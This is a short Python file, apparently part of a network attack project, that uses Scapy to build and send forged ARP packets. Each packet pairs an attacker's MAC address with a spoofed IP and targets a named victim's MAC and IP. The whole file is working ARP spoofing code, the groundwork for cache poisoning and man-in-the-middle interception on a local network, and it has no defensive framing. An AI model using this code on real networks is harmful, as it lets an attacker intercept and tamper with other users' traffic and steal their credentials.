from scapy.all import *

class ARPPacket:
    def __init__(self, attacker, victim, spoof_ip):
        arp = Ether() / ARP()
        arp[Ether].src = attacker.MAC
        arp[ARP].hwsrc = attacker.MAC

        arp[ARP].psrc = spoof_ip

        arp[ARP].hwdst = victim.MAC
        arp[ARP].pdst = victim.IP

        self.packet = arp

    def get(self):
        return self.packet

    def send(self):
        sendp(self.packet, iface="enp0s3")